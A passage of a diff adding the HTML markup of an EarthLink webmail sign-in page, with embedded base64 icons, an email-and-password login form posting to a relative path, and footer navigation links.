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"
+              style="height: 26px; margin-top: 3px"
+              alt="home" /></a
+          ><a
+            href="https://webmail1.earthlink.net"
+            target="_blank"
+            style="
+              font-size: 11px;
+              font-family: Arial;
+              font-weight: normal;
+              padding: 0px 5px;
+            "
+            ><img
+              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAmCAYAAACoPemuAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo1M0Q1MzIyMDU3OUMxMUU0QkVDM0VFMDk0RTAwRTVGNCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo1M0Q1MzIyMTU3OUMxMUU0QkVDM0VFMDk0RTAwRTVGNCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjJFRDIzM0Y1NTc5QzExRTRCRUMzRUUwOTRFMDBFNUY0IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjJFRDIzM0Y2NTc5QzExRTRCRUMzRUUwOTRFMDBFNUY0Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+sV8JLgAABbtJREFUeNq8mEtPW0cUxw/GmHdpahIBUZoFAcOCFFCIGpPgQBql8sKfAGWVFVJ2qF1G2TVRF5UisWKF+glYoLolaUyCCUXlkUQVkCZVilScIBsJg1+8+v9P73WvjW0uYBjp4Ms8zvndM3POzJ2C3d1dMRafzye5SkFBgQ3ihHRALkIaIefQZNe6BKFzCbIIeQmZgvghCTFRXC6X+rWKyWKxWJogHojbarW6CgsLWacEYMautYCo3dnZuQyR7e1t2dra8uF5BDIMmTdjz2oCqAZyGzC9RUVFLRDRBXWiA+pwnAEDkGxublJcmvSi7ke0D0EChwKjIRi8BYA+m83mgUhJSYkUFxcLn9OhjGDpcIlEQuLxuMRisRY8P4B0AnIAfbzpSyknGI3B6B0A9APEUVZWJqWlpSlQRqBMYEZAI1w0GpVIJOLBswN13wN+kH32BaNBGL4L79wDjL28vDwJxemjl4wgmTxtbCMcX4Rj+VK6bGxsOAD5HbxYCvBH6XB7wKDgDqEAZK+oqBB6S/dSLqBcS0IXvpQOqS0FO+rvAS6KqU3xXArYxMTELXinH0D2ysrKJJTupaMUHY5QejRry4Fppp8pBp7z7gHz+/01gOqDpxyE4hQSKkM6ODIgX5RLw7AuHZA+TO0c/g2kgAHiNsA8xunLN1RaxCsbhgj2QMbR/FCtdf6ZnJxswhv00kvHDZUJjjZpmwxkSYIxT6GxhdGXrzV1kGmlTdomA1kUGAjxbHPrKUGPvpMqtEWbtK05xk0mK6LEifTg0vOUDjUy8pN8/LhybEBnzpwWt/vrJBxtk4EsSL5OCyo69IxunMLw+obcvHlDqj6tyisQ9VEv9WeaUs1BHQS7aEygeolGIjL2bFzaWr+Q5uamvEBRD/VRL/VnmlKykIlgjca9z1jisZg8fTqmwrm72yWliJ7DFI7jeOqhPurNFqXazkAm67n9onBhYVH+WV6Wq51XZHHxjbx//7dpqPPnP5fGxgZ5MfmbhNfCpqKUTBbuV2ZyFpWOPn4ipz47JU7nFUHU5D7ood3p/FL157j9oIxeI5M1/TyVq+zu7MrszJycRkT1YGpmZ+cyRi4jrhVraQbtKweIbJ1D7aN4CB701EBjXCvXrnVKe3urFFj+G8vftrZWVc/2lQOmG8NJJMjMv3TQxVxRWaEW8+vXf0gwGJKvbvTI2bN16jcUCqn669e7VL9DliWr9jVzmZupGa/VX6iXBojf/0LW1tZUHaezudkhz8cnkmlgeTmAYHHKmz/fyluImWI4+S5aEMIv9YpcxVZsk66uq1JV9Yl4f/4lCaVyHo7L09OzKbmJ7ezH/hzH8WbByGTBUWOK+SUXWE1tjZqmBaSK6d9nVBCY8gD6sT/HcTz17AemHYGmLDg1+vHgywTG6Lh0qV0aGi7I6OgT+RD4cKgFw3EcTz3UR73ZwMhCJkt9fX0CDyOZvNbd45LQ6qo8G3uuvnKOUjieekKhVaU3m7fIQiarNmgYFb3IuC16ADBXPR79Ne+ninfv/lJC/elgYHhFFpU6dC8Fg8FvcIp8cNLnMQMUP+m+tdvt/x+t1YYdjw/hE2p4v+g8LjDaJkNyfesPdXV1ATQMgHzhJOE0by3QNtJOYA8YS3V1tVf7bA+eBJwWhUHaBJQ3YsiDe+IWjYPoeB8RcqxwWhQS6j5tYn2pu42sVwTr6+vMM48QAFFequDZke9g0KAW6ClC0SZ3D2NK2gNGcg1kkJ/tgOvD+ciTLzht+oYBMQAobzgcVjZjONXy2iorWEw79mpv5cW33hzgxnlxB7iWwwJq++ArXtwBaghQAXpKh2K6yHqpwsIbQH0z1S7eAvjee4ivl2GcxT3wnhtwLrOAmi4fdI1oKWGe00Yg/maCygimX7RxEMEIyrkH3Dzg5uG9H+A9J9ZeyuWwdmtDiJTLYeib4t4HHQnDxZ1a6NRLG5ku7v4VYAB9JcyPjyqFCwAAAABJRU5ErkJggg=="
+              style="height: 26px; margin-top: 3px"
+              alt="web mail" /></a
+          ><span
+            ><a
+              style="
+                font-size: 11px;
+                font-family: Arial;
+                font-weight: normal;
+                padding: 0px 5px;
+              "
+              href="https://earthlink.net/about-us/contact"
+              target="_blank"
+              ><img
+                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAmCAYAAACoPemuAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo1M0Q1MzIyNDU3OUMxMUU0QkVDM0VFMDk0RTAwRTVGNCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo1M0Q1MzIyNTU3OUMxMUU0QkVDM0VFMDk0RTAwRTVGNCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjUzRDUzMjIyNTc5QzExRTRCRUMzRUUwOTRFMDBFNUY0IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjUzRDUzMjIzNTc5QzExRTRCRUMzRUUwOTRFMDBFNUY0Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+kfaXHgAABrdJREFUeNq0mF9M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"
+                alt="gear icon"
+                style="height: 26px; margin-top: 3px" /></a
+          ></span>
+        </div>
+      </div>
+      <div class="center-logo-div">
+        <a href="https://www.earthlink.net"
+          ><img
+            src="data:image/png;base64,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"
+            alt="EarthLink"
+        /></a>
+      </div>
+      <div class="outer-div">
+        <div class="inner-div">
+          <div class="heading-div">
+            <!-- TODO: (LEG2-6775) replace password with userId when webmail be ready for userId state--><!-- TODO: (LEG2-6775) replace this and remove #loggedout when webmail be ready for userId state--><!--h3 Enter Password--><!--h4 Enter your password to continue.-->
+            <h3>Welcome to EarthLink</h3>
+            <h4>Sign in to get started</h4>
+            <p class="logged-out hidden" id="loggedout">
+              You have signed out from all EarthLink websites
+            </p>
+          </div>
+          <div>
+            <form id="contact-form" action="login" method="POST">
+              <table style="margin-bottom: 15px">
+                <!-- TODO: (LEG2-6775) replace email input with hidden input when webmail be ready for userId state--><!--input(type="hidden", name="email", value=email)-->
+                <tr>
+                  <td>
+                    <label class="label-div" for="email">Email Address:</label
+                    ><input
+                      type="email"
+                      id="email"
+                      name="email"
+                      style="margin-top: 10px; margin-bottom: 10px"
+                    />
+                    <p
+                      class="hidden font-size-14"
+                      id="email-error-message"
+                      style="color: red"
+                    >
+                      This field is required.
+                    </p>
+                  </td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>
+                    <label class="label-div" for="password">Password:</label>
+                    <div class="password-input-wrapper">
+                      <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        style="margin-top: 10px; margin-bottom: 10px"
+                      /><span class="password-toggle-icon" id="eye-icon"
+                        ><i class="fa fa-eye-slash" aria-hidden="true"></i
+                      ></span>
+                      <p
+                        class="hidden font-size-14"
+                        id="password-error-message"
+                        style="color: red"
+                      >
+                        This field is required.
+                      </p>
+                    </div>
+                  </td>
+                  <td></td>
+                </tr>
+              </table>
+              <!-- TODO: (LEG2-6775) remove this state (password) when webmail be ready for userId state-->
+              <div class="under-table-div display-flex align-items">
+                <div class="display-flex align-items">
+                  <input
+                    class="checkbox-input font-size-14"
+                    type="checkbox"
+                    id="remember"
+                    name="remember"
+                    value="1"
+                  /><label
+                    class="color-black font-size-14 font-weight-500"
+                    for="remember"
+                    >Remember username</label
+                  >
+                </div>
+                <a
+                  class="link-color font-size-14"
+                  href="https://portal.earthlink.net/login/forgot-password/email"
+                  style="width=100%"
+                  >Forgot your password?</a
+                >
+              </div>
+              <br />
+              <div
+                class="display-flex margin-top"
+                style="justify-content: space-between"
+              >
+                <button
+                  class="button-background-color color-white cursor-pointer sign-in-button"
+                  type="submit"
+                  id="accept"
+                  name="submit"
+                  value="Sign In"
+                >
+                  <span id="button-text">Sign In</span
+                  ><span class="hidden" id="spinner"
+                    ><i class="fa fa-spinner fa-spin"></i
+                  ></span>
+                </button>
+              </div>
+              <!-- TODO: (LEG2-6775) uncomment this when webmail be ready for userId state--><!--div(class="display-flex align-items justify-center", style='margin-top: 10px;')--><!--    a(href='https://portal.earthlink.net/login/forgot-password/email' class="link-color font-size-14" style="width=100%") Forgot password?--><!--br--><!-- TODO: (LEG2-6775) remove this when webmail be ready for userId state-->
+              <div class="display-flex" style="justify-content: space-between">
+                <a
+                  class="button-div"
+                  href="https://pay.earthlink.net/"
+                  target="_blank"
+                  style="width: 48%"
+                  ><input
+                    class="button-background-color color-white cursor-pointer"
+                    type="button"
+                    value="Make a Payment" /></a
+                ><a
+                  class="button-div"
+                  href="https://earthlink.net/about-us/contact"
+                  target="_blank"
+                  style="width: 48%"
+                  ><input
+                    class="button-background-color color-white cursor-pointer"
+                    type="button"
+                    value="Support"
+                /></a>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="desktop-footer footer-top">
+          <div class="footer-ul-div">
+            <h3 class="list-heading">Internet</h3>
+            <ul>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/internet/#/"
+                  >High-Speed Internet</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/internet/fiber-internet"
+                  >Fiber Internet</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/internet/wireless-home-internet"
+                  >Wireless Home Internet</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/internet/satellite-internet"
+                  >Satellite Internet</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/internet/rural-internet"
+                  >Rural Internet</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/internet-near-me "
+                  >Internet Near Me</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div class="footer-ul-div">
+            <h3 class="list-heading">EarthLink</h3>
+            <ul>
+              <li>
+                <a class="list-anchor" href="https://www.earthlink.net/about-us"
+                  >About Us</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/about-us/contact"
+                  >Contact</a
+                >
+              </li>
+              <li>
+                <a class="list-anchor" href="https://www.earthlink.net/blog/"
+                  >Blog</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/about-us/careers"
+                  >Careers</a
+                >
+              </li>
+              <li>
+                <a class="list-anchor" href="https://www.earthlink.net/tcs"
+                  >Terms & Conditions</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div class="footer-ul-div">
+            <h3 class="list-heading">Help</h3>
+            <ul>
+              <li>
+                <a class="list-anchor" href="https://help.earthlink.net/"
+                  >Support</a
+                >
+              </li>
+              <li>
+                <a
+                  class="list-anchor"
+                  href="https://www.earthlink.net/live-chat"
+                  >Live Chat</a
+                >
+              </li>
+            </ul>
+            <h3
+              class="list-heading"
+              style="margin-top: 20px; margin-bottom: 10px"
+            >
+              Follow EarthLink
+            </h3>
+            <ul class="display-flex">
+              <li>
+                <a
+                  class="social-anchor"
+                  href="https://www.facebook.com/earthlink"
+                  ><i class="fa fa-facebook social-icon" aria-hidden="true"></i
+                ></a>
+              </li>
+              <li>
+                <a class="social-anchor" href="https://twitter.com/earthlink"
+                  ><i class="fa fa-twitter social-icon" aria-hidden="true"></i
+                ></a>
+              </li>
+              <li>
+                <a
+                  class="social-anchor"
+                  href="https://www.linkedin.com/company/earthlink-internet"
+                  ><i class="fa fa-linkedin social-icon" aria-hidden="true"></i
+                ></a>
+              </li>
+              <li>
+                <a
+                  class="social-anchor"
+                  href="https://www.youtube.com/c/EarthLinkOrbit"
+                  ><i
+                    class="fa fa-youtube-play social-icon"
+                    aria-hidden="true"
+                  ></i
+                ></a>
+              </li>
+            </ul>
+          </div>
+          <div class="footer-ul-div">
+            <h3 class="list-heading">Account</h3>
+            <ul>
+              <li>
+                <a class="list-anchor" href="https://portal.earthlink.net"
+                  >My Account</a
+                >
+              </li>
+              <li>
+                <a class="list-anchor" href="https://webmail1.earthlink.net"
+                  >WebMail</a
+                >
+              </li>
+              <li>
+                <a class="list-anchor" href="https://my.earthlink.net"
+                  >My EarthLink</a
+                >
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div class="desktop-footer footer-bottom">
+          <p class="list-anchor" style="text-decoration: none">
+            © 2026 EarthLink, LLC&nbsp;•&nbsp;All rights reserved
+          </p>
+          <img
